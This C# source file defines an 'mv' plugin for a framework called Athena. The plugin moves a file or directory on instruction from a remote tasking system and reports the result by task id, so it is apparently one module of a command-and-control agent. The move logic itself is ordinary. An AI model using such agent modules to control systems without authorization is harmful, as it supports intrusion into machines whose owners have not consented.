using System.IO;
using System;
using System.Collections.Generic;
using Athena.Commands.Models;
using Athena.Models;
using Athena.Commands;

namespace Plugins
{
    public class Mv : AthenaPlugin
    {
        public override string Name => "mv";
        public override void Execute(Dictionary<string, string> args)
        {
            if (args.ContainsKey("source") && args.ContainsKey("destination"))
            {
                try
                {
                    FileAttributes attr = File.GetAttributes((args["source"]).Replace("\"", ""));

                    // Check if Directory
                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        Directory.Move((args["source"]).Replace("\"", ""), (args["destination"]).Replace("\"", ""));
                    }
                    else
                    {
                        File.Move((args["source"]).Replace("\"", ""), (args["destination"]).Replace("\"", ""));
                    }

                    TaskResponseHandler.AddResponse(new ResponseResult
                    {
                        completed = true,
                        user_output = $"Moved {(args["source"]).Replace("\"", "")} to {(args["destination"]).Replace("\"", "")}",
                        task_id = args["task-id"],
                    });
                }
                catch (Exception e)
                {
                    TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                    return;
                }
            }
            else
            {
                TaskResponseHandler.AddResponse(new ResponseResult
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x2B" } },
                    task_id = args["task-id"],
                });
            }
        }
    }
}
